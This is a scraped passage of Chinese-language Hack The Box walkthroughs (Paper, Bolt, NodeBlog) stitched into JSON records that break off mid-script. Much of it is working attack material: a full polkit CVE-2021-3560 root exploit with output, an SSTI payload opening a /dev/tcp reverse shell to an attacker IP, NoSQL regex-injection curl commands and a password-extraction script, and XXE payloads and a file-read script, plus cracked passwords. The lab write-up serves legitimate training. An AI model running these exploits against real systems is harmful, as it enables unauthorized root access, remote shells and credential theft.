drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak -rwxr-xr-x 1 dwight dwight 1062 Sep 16 07:34 package.json -rwxr-xr-x 1 dwight dwight 972 Sep 16 07:26 package.json.bak -rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json -rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile -rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 README.md drwx--x--x 2 dwight dwight 193 Jan 13 10:56 scripts -rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_bot.sh drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode -rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock 在hubot目录中，有一个.env文件，咱们查看一下这个文件 recyclops file ../hubot/.env export ROCKETCHAT_URL=&#39;http://127.0.0.1:48320&#39; export ROCKETCHAT_USER=recyclops export ROCKETCHAT_PASSWORD=Queenofblad3s!23 export ROCKETCHAT_USESSL=false export RESPOND_TO_DM=true export RESPOND_TO_EDITED=true export PORT=8000 export BIND_ADDRESS=127.0.0.1 这里得到了一个密码 Queenofblad3s!23 去使用ssh登录试试 ┌──(root💀kali)-[~/Desktop] └─# ssh dwight@10.10.11.143 The authenticity of host &#39;10.10.11.143 (10.10.11.143)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:2eiFA8VFQOZukubwDkd24z/kfLkdKlz4wkAa/lRN3Lg. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.143&#39; (ECDSA) to the list of known hosts. dwight@10.10.11.143&#39;s password: Activate the web console with: systemctl enable --now cockpit.socket Last login: Fri Feb 18 23:58:30 2022 from 10.10.14.56 [dwight@paper ~]$ whoami&amp;&amp;id dwight uid=1004(dwight) gid=1004(dwight) groups=1004(dwight) 成功获得user权限 [dwight@paper ~]$ ls bot_restart.sh hubot linpeas.sh sales testfile.py user.txt [dwight@paper ~]$ cat user.txt 8247362b1baac2f85fd97507b5104341 成功获得user权限的flag文件 权限提升Root这里使用CVE-2021-3560进行提权 import os import sys import time import subprocess import random import pwd print (&quot;**************&quot;) print(&quot;Exploit: Privilege escalation with polkit - CVE-2021-3560&quot;) print(&quot;Exploit code written by Ahmad Almorabea @almorabea&quot;) print(&quot;Original exploit author: Kevin Backhouse &quot;) print(&quot;For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/&quot;) print (&quot;**************&quot;) print(&quot;[+] Starting the Exploit &quot;) time.sleep(3) check = True counter = 0 while check: counter = counter +1 process = subprocess.Popen([&#39;dbus-send&#39;,&#39;--system&#39;,&#39;--dest=org.freedesktop.Accounts&#39;,&#39;--type=method_call&#39;,&#39;--print-reply&#39;,&#39;/org/freedesktop/Accounts&#39;,&#39;org.freedesktop.Accounts.CreateUser&#39;,&#39;string:ahmed&#39;,&#39;string:&quot;Ahmad Almorabea&#39;,&#39;int32:1&#39;]) try: #print(&#39;1 - Running in process&#39;, process.pid) Random = random.uniform(0.006,0.009) process.wait(timeout=Random) process.kill() except subprocess.TimeoutExpired: #print(&#39;Timed out - killing&#39;, process.pid) process.kill() user = subprocess.run([&#39;id&#39;, &#39;ahmed&#39;], stdout=subprocess.PIPE).stdout.decode(&#39;utf-8&#39;) if user.find(&quot;uid&quot;) != -1: print(&quot;[+] User Created with the name of ahmed&quot;) print(&quot;[+] Timed out at: &quot;+str(Random)) check =False break if counter &gt; 2000: print(&quot;[-] Couldn&#39;t add the user, try again it may work&quot;) sys.exit(0) for i in range(200): #print(i) uid = &quot;/org/freedesktop/Accounts/User&quot;+str(pwd.getpwnam(&#39;ahmed&#39;).pw_uid) #In case you need to put a password un-comment the code below and put your password after string:yourpassword&#39; password = &quot;string:&quot; #res = subprocess.run([&#39;openssl&#39;, &#39;passwd&#39;,&#39;-5&#39;,password], stdout=subprocess.PIPE).stdout.decode(&#39;utf-8&#39;) #password = f&quot;string:{res.rstrip()}&quot; process = subprocess.Popen([&#39;dbus-send&#39;,&#39;--system&#39;,&#39;--dest=org.freedesktop.Accounts&#39;,&#39;--type=method_call&#39;,&#39;--print-reply&#39;,uid,&#39;org.freedesktop.Accounts.User.SetPassword&#39;,password,&#39;string:GoldenEye&#39;]) try: #print(&#39;1 - Running in process&#39;, process.pid) Random = random.uniform(0.006,0.009) process.wait(timeout=Random) process.kill() except subprocess.TimeoutExpired: #print(&#39;Timed out - killing&#39;, process.pid) process.kill() print(&quot;[+] Timed out at: &quot; + str(Random)) print(&quot;[+] Exploit Completed, Your new user is &#39;Ahmed&#39; just log into it like, &#39;su ahmed&#39;, and then &#39;sudo su&#39; to root &quot;) p = subprocess.call(&quot;(su ahmed -c &#39;sudo su&#39;)&quot;, shell=True) [dwight@paper ~]$ python3 CVE-2021-3560.py ************** Exploit: Privilege escalation with polkit - CVE-2021-3560 Exploit code written by Ahmad Almorabea @almorabea Original exploit author: Kevin Backhouse For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/ ************** [+] Starting the Exploit id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user [+] User Created with the name of ahmed [+] Timed out at: 0.008836088833898081 ... Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005 Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005 Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005 [+] Timed out at: 0.008945334127711566 [+] Exploit Completed, Your new user is &#39;Ahmed&#39; just log into it like, &#39;su ahmed&#39;, and then &#39;sudo su&#39; to root Password: su: Authentication failure 出现这种就是执行失败，反复多次执行，出现下列提示就是成功了 [dwight@paper ~]$ python3 CVE-2021-3560.py ************** Exploit: Privilege escalation with polkit - CVE-2021-3560 Exploit code written by Ahmad Almorabea @almorabea Original exploit author: Kevin Backhouse For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/ ************** [+] Starting the Exploit [+] User Created with the name of ahmed [+] Timed out at: 0.008008275505860037 [+] Timed out at: 0.00782768600159978 [+] Exploit Completed, Your new user is &#39;Ahmed&#39; just log into it like, &#39;su ahmed&#39;, and then &#39;sudo su&#39; to root bash: cannot set terminal process group (118347): Inappropriate ioctl for device bash: no job control in this shell [root@paper dwight]# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功获得root权限 [root@paper dwight]# cd /root [root@paper ~]# ls anaconda-ks.cfg initial-setup-ks.cfg root.txt [root@paper ~]# cat root.txt fb28d8a0b971692ac9726bf448af8497 成功拿到root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Bolt - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Bolt","date":"2022-01-17T11:38:36.000Z","updated":"2023-06-13T03:41:09.000Z","comments":true,"path":"2022/01/17/Hackthebox/Medium/Hackthebox-Bolt/","link":"","permalink":"http://www.lucifiel.com/2022/01/17/Hackthebox/Medium/Hackthebox-Bolt/","excerpt":"","text":"Hackthebox - Bolt靶场信息 靶场类型 信息搜集首先使用nmap进行端口扫描 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.114 Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 20:07 EST Warning: 10.10.11.114 giving up on port because retransmission cap hit (10). Nmap scan report for bogon (10.10.11.114) Host is up (0.26s latency). Not shown: 65527 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Starter Website - About 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 15062/tcp filtered unknown 17825/tcp filtered unknown 37303/tcp filtered unknown 40042/tcp filtered unknown 63830/tcp filtered unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=1/4%OT=22%CT=1%CU=33320%PV=Y%DS=2%DC=T%G=Y%TM=61D4F026 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 23/tcp) HOP RTT ADDRESS 1 266.28 ms bogon (10.10.14.1) 2 266.96 ms bogon (10.10.11.114) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 237.89 seconds 首先去看看80端口的http服务 添加到hosts ┌──(root💀kali)-[~/Desktop] └─# echo 10.10.11.114 bolt.htb &gt;&gt; /etc/hosts 这里有个登录按钮，进去看看 尝试下有没有弱口令 使用admin账户进行登录，提示的是密码错误，那是不是可以爆破账号呢？用admin1测试一下 是的，提示完全不一样，目前可以确定admin账号存在了 尝试注册账号却提示500，去扫个目录试试 ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.11.114/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.114/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ contact [Status: 200, Size: 26293, Words: 10060, Lines: 468] logout [Status: 302, Size: 209, Words: 22, Lines: 4] login [Status: 200, Size: 9287, Words: 2135, Lines: 173] register [Status: 200, Size: 11038, Words: 3053, Lines: 199] download [Status: 200, Size: 18570, Words: 5374, Lines: 346] services [Status: 200, Size: 22443, Words: 7170, Lines: 405] pricing [Status: 200, Size: 31731, Words: 11055, Lines: 549] sign-up [Status: 200, Size: 11038, Words: 3053, Lines: 199] sign-in [Status: 200, Size: 9287, Words: 2135, Lines: 173] [Status: 200, Size: 30347, Words: 10870, Lines: 505] check-email [Status: 200, Size: 7331, Words: 1224, Lines: 147] :: Progress: [20116/20116] :: Job [1/1] :: 61 req/sec :: Duration: [0:03:19] :: Errors: 0 :: 都测试了一遍，暂时没什么思路，不过sign-up和sign-in页面会提示405，感觉是被什么东西过滤了，先放着不管，看看有没有其他思路吧 在&#x2F;download目录下，咱们可以下载一个压缩文件image.tar 把它下载下来看看 ┌──(root💀kali)-[~/Desktop/image] └─# ls -la 总用量 64 drwxr-xr-x 13 root root 4096 1月 6 01:03 . drwxr-xr-x 4 root root 4096 1月 6 01:03 .. drwxr-xr-x 2 root root 4096 3月 5 2021 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950 drwxr-xr-x 2 root root 4096 3月 5 2021 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c drwxr-xr-x 2 root root 4096 3月 5 2021 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa drwxr-xr-x 2 root root 4096 3月 5 2021 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab drwxr-xr-x 2 root root 4096 3月 5 2021 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162 drwxr-xr-x 2 root root 4096 3月 5 2021 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b drwxr-xr-x 2 root root 4096 3月 5 2021 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad drwxr-xr-x 2 root root 4096 3月 5 2021 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf -rw-r--r-- 1 root root 3797 3月 5 2021 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json drwxr-xr-x 2 root root 4096 3月 5 2021 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77 drwxr-xr-x 3 root root 4096 1月 6 01:03 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2 drwxr-xr-x 2 root root 4096 3月 5 2021 d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26 -rw-r--r-- 1 root root 1002 12月 31 1969 manifest.json -rw-r--r-- 1 root root 119 12月 31 1969 repositories 下载下来解压后，会有很多文件，在其中一个文件夹a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2中的layer.tar里，找到了一个文件db.sqlite3 ┌──(root💀kali)-[~/Desktop/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer] └─# ls -la 总用量 32 drwxr-xr-x 4 root root 4096 1月 6 01:03 . drwxr-xr-x 3 root root 4096 1月 6 01:03 .. -rw-r--r-- 1 root root 16384 3月 5 2021 db.sqlite3 drwx------ 2 root root 4096 3月 5 2021 root drwxrwxrwt 2 root root 4096 3月 5 2021 tmp 使用sqlite3查看一下数据库 ┌──(root💀kali)-[~/Desktop/image] └─# sqlite3 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer/db.sqlite3 1 ⚙ SQLite version 3.34.1 2021-01-20 14:10:07 Enter &quot;.help&quot; for usage hints. sqlite&gt; .table User sqlite&gt; select * from user; 1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.|| 得到了一个账号，邮箱，以及一穿密码hash 使用john爆破一下密码 ┌──(root💀kali)-[~/Desktop] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot; Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status deadbolt (?) 1g 0:00:00:01 DONE (2022-01-06 01:11) 0.6451g/s 111483p/s 111483c/s 111483C/s debie..curtis13 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed 现在得到了账号密码 username = admin password = deadbolt email = admin@bolt.htb 拿着账号密码去登录后台 在首页的位置，有一个在线聊天窗口，我感觉应该是有XSS没跑 在聊天内容中提到了有其他主机，那就找一下吧，看看能不能找到 ┌──(root💀kali)-[~/Desktop] └─# ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://bolt.htb&quot; -H &quot;Host:FUZZ.bolt.htb&quot; -fs 30347 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://bolt.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.bolt.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 30347 ________________________________________________ demo [Status: 302, Size: 219, Words: 22, Lines: 4] mail [Status: 200, Size: 4943, Words: 345, Lines: 99] lists [Status: 200, Size: 0, Words: 1, Lines: 1] videos [Status: 200, Size: 0, Words: 1, Lines: 1] disco [Status: 200, Size: 0, Words: 1, Lines: 1] :: Progress: [4989/4989] :: Job [1/1] :: 35 req/sec :: Duration: [0:02:34] :: Errors: 0 :: 发现两个可用子域名demo和mail，给他们加入到hosts里 echo 10.10.11.114 demo.bolt.htb mail.bolt.htb &gt;&gt; /etc/hosts 在demo这一个页面里发现有新的注册点，可以进行注册，但是缺少了一个邀请码 ┌──(root💀kali)-[~/Desktop/image] └─# grep -iR -A 2 &#39;invite_code&#39; 2&gt;/dev/null -- 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html: {{ form.invite_code(placeholder=\"Invite Code\", class=\"form-control\") }} 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html- &lt;div class=&quot;input-group-append&quot;&gt; 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html- &lt;div class=&quot;input-group-text&quot;&gt; -- 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py: invite_code = TextField(&#39;Invite Code&#39;, id=&#39;invite_code&#39; , validators=[DataRequired()]) -- 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py: code = request.form[&#39;invite_code&#39;] 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py- if code != &#39;XNSS-HSJW-3NGU-8XTJ&#39;: 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py- return render_template(&#39;code-500.html&#39;) 显示邀请码在41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad&#x2F;app&#x2F;base&#x2F;routes.py中，去查看一下 if code != &#39;XNSS-HSJW-3NGU-8XTJ&#39;: 找到邀请码，去注册一个账号 注册后登录即可，新注册的账号在demo和mail上都可以进行登录 在setting处的name里，存在一个SSTI，这里测试一下 修改后收到了邮件 点击链接确认后，仪表盘上没有任何变化，但是却收到了另一封邮件，里面显示了我们输入的结果 确认存在SSTI https://github.com/swisskyrepo/PayloadsAllTheThings/blob/add722d1c27d90f15d313e8846e5a0f8b36a403a/Server Side Template Injection/README.md#exploit-the-ssti-by-calling-ospopenread 使用该poc进行利用 成功执行命令 现在构造一个poc来获得一个shell {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('/bin/bash -c \"/bin/bash -i &>/dev/tcp/10.10.14.16/4444","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"NodeBlog - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-NodeBlog","date":"2022-01-10T11:38:36.000Z","updated":"2023-06-17T02:21:13.000Z","comments":true,"path":"2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/","link":"","permalink":"http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/","excerpt":"","text":"Hackthebox - NodeBlog靶场信息 靶场类型 信息搜集首先使用nmap进行信息搜集 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.139 Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-19 20:19 EST Nmap scan report for 10.10.11.139 Host is up (0.23s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 5000/tcp open http Node.js (Express middleware) |_http-title: Blog No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=1/19%OT=22%CT=1%CU=34477%PV=Y%DS=2%DC=T%G=Y%TM=61E8B8C OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=1 OS:00%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2= OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 221.92 ms 10.10.14.1 2 222.21 ms 10.10.11.139 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.53 seconds 去看一下5000端口 去看看登陆处 ┌──(root💀kali)-[~/Desktop] └─# curl 10.10.11.139:5000/login -sd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123&quot;}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid Invalid Password 使用账号admin提示密码无效 ┌──(root💀kali)-[~/Desktop] └─# curl 10.10.11.139:5000/login -sd &#39;{&quot;user&quot;:&quot;admin1&quot;,&quot;password&quot;:&quot;123&quot;}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid Invalid Username 使用账号admin1提示账号无效 得出结论：这里可以爆破账号 但是fuzz后没有发现可以其他账号，也没有爆破进去 接着测试一下是否有其他漏洞，例如注入 ┌──(root💀kali)-[~/Desktop] └─# curl 10.10.11.139:5000/login -isd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;&quot;}}&#39; -H &#39;Content-Type: application/json&#39; HTTP/1.1 200 OK X-Powered-By: Express Set-Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D; Max-Age=900; Path=/; Expires=Thu, 20 Jan 2022 10:27:09 GMT; HttpOnly Content-Type: text/html; charset=utf-8 Content-Length: 2589 ETag: W/&quot;a1d-JGrC4mhnlEApoTWWPEhYOlLd+UA&quot; Date: Thu, 20 Jan 2022 10:12:09 GMT Connection: keep-alive Keep-Alive: timeout=5 尝试了一下regex注入，确认是可以并且存在nosql注入的 漏洞利用首先去确定一下admin账户所使用密码的长度 ┌──(root💀kali)-[~/Desktop] └─# curl 10.10.11.139:5000/login -isd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{24}$&quot;}}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid Invalid Password ┌──(root💀kali)-[~/Desktop] └─# curl 10.10.11.139:5000/login -isd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{25}$&quot;}}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid 成功确定密码的位数为25位 可以使用regex正则匹配一个一个确认密码是啥，不过内容太繁琐了，这里找到一个脚本，直接使用脚本进行利用 #!/usr/bin/env bash url=10.10.11.139:5000/login user=admin function do_nosqli() { curl $url -H &#39;Content-Type: application/json&#39; -sd $1 | grep Invalid } while true; do data=&#39;{&quot;user&quot;:&quot;&#39;$user&#39;&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{&#39;$password_length&#39;}$&quot;}}&#39; echo -ne &quot;Password length: $password_length\\r&quot; if [ -z &quot;$(do_nosqli &quot;$data&quot;)&quot; ]; then break fi password_length=$((password_length + 1)) done echo for i in $(seq 1 $password_length); do echo -ne &quot;Password: $password\\r&quot; for c in {A..Z} {a..z} {0..9}; do data=&#39;{&quot;user&quot;:&quot;&#39;$user&#39;&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^&#39;$password$c&#39;.{&#39;$(($password_length - $i))&#39;}$&quot;}}&#39; if [ -z &quot;$(do_nosqli $data)&quot; ]; then password+=$c break fi done done echo ┌──(root💀kali)-[~/Desktop] └─# bash nosqli.sh Password length: 25 Password: IppsecSaysPleaseSubscribe 成功拿到账号密码，去后台登录 成功登录 Error: Failed to lookup view &quot;articles/${path}&quot; in views directory &quot;/opt/blog/views&quot; at Function.render (/opt/blog/node_modules/express/lib/application.js:580:17) at ServerResponse.render (/opt/blog/node_modules/express/lib/response.js:1012:7) at /opt/blog/routes/articles.js:81:17 at processTicksAndRejections (internal/process/task_queues.js:95:5) 尝试创建一篇新文章时报错 Invalid XML Example: Example DescriptionExample Markdown 上传新文件时提示无效的XML示例 现在梳理一下我们拥有的条件 知道程序的绝对路径在&#x2F;opt&#x2F;blog 需要上传一个正确的XML示例 那咱们就来构造一个吧 &lt;?xml version=&quot;1.0&quot;?&gt; &lt;post&gt; &lt;title&gt;Lucifiel&lt;/title&gt; &lt;description&gt;&lt;/description&gt; &lt;markdown&gt;&lt;/markdown&gt; &lt;/post&gt; 上传该xml文件会跳转到编写新文章 &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;post&gt; &lt;title&gt;Lucifiel&lt;/title&gt; &lt;description&gt;&amp;xxe;&lt;/description&gt; &lt;markdown&gt;&lt;/markdown&gt; &lt;/post&gt; 成功执行XXE 用一个python脚本来执行任意文件读取 #!/usr/bin/env python3 import html import re import requests import sys def send_xml(filename): xml = f&#39;&#39;&#39;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file://{filename}&quot;&gt; ]&gt; &lt;example&gt; &lt;title&gt;&lt;/title&gt; &lt;description&gt;&amp;xxe;&lt;/description&gt; &lt;markdown&gt;&lt;/markdown&gt; &lt;/example&gt; &#39;&#39;&#39; res = requests.post(&#39;http://10.10.11.139:5000/articles/xml&#39;, files={&#39;file&#39;: (&#39;test.xml&#39;, xml)}) return res.text def main(): if len(sys.argv) == 1: print(f&#39;Usage: python3 {sys.argv[0]} &lt;filename&gt;&#39;) exit(1) filename = sys.argv[1] xml = send_xml(filename) try: print(html.unescape(re.findall(r&#39;&lt;textarea.*?&gt;(.*?)&lt;/textarea&gt;&#39;, xml, re.DOTALL)[0])) except IndexError: print(&#39;Not Found&#39;) if __name__ == &#39;__main__&#39;: main() 找到了一个利用脚本 #!/usr/bin/env node const axios = require(&#39;axios&#39;) const user = &#39;admin&#39; const password = &#39;IppsecSaysPleaseSubscribe&#39; const baseUrl = &#39;http://10.10.11.139:5000&#39; const [lhost, lport] = 